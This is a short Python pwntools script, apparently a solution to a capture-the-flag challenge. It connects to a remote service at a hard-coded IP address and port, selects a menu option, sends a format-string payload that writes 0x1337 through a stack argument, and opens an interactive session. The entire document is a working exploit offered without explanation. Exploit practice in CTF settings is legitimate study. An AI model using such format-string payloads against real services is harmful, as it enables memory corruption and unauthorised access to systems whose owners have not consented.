from pwn import *
import os

os.system('clear')
context.log_level = 'debug'
sh = remote('142.93.37.215', 30803)
sh.recvuntil("> ")
sh.sendline(b'1')
sh.recvuntil(": ")
A = b'%4919c%7$hn'
sh.sendline(A)
sh.interactive()
